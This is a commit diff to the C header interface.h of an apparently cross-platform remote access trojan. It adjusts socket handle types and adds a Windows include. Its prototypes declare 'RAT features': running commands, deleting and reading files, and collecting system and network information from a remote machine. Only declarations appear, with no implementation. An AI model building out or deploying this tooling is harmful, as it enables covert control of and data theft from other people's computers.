364817051e374ea872bff93a6024a2495d6e3b89
D3cl4n <38691337+D3cl4n@users.noreply.github.com>
2020-06-20 23:27:50 -0400

    Update interface.h

--- interface.h
+++ interface.h
@@ -1,7 +1,10 @@
+/* includes? */
+
 /* Common Interface for windows.c and linux.c */
 
 /* Preprocessor conditionals to specify abstract return type based on platform */
 #if _WIN32
+    #include <winsock2.h>
     typedef SOCKET Hndl;
 
 #elif __linux__
@@ -11,17 +14,17 @@
 
 /* Function prototypes for socket IO */
 Hndl create_socket(const char *host, int port);
-Hndl bind_socket(int port, int sockfd);
-Hndl listen_socket(int max_connections, int sockfd);
-Hndl accept_socket(int sockfd, int port);
-Hndl read_socket(int sockfd, char buffer[], int len);
+int bind_socket(int port, Hndl sockfd);
+int listen_socket(int max_connections, Hndl sockfd);
+Hndl accept_socket(Hndl sockfd, int port);
+int read_socket(Hndl sockfd, char buffer[], int len);
 
 /* Function prototypes for RAT features */
-void run_command(int sockfd, const char *argument);
-void delete_file(int sockfd, const char *argument);
-void system_info(int sockfd);
-void networking_info(int sockfd);
-void read_file(int sockfd, const char *filepath);
+void run_command(Hndl sockfd, const char *argument);
+void delete_file(Hndl sockfd, const char *argument);
+void system_info(Hndl sockfd);
+void networking_info(Hndl sockfd);
+void read_file(Hndl sockfd, const char *filepath);
 
 const char *parse_feature(char input[]);
 const char *parse_argument(char input[]);
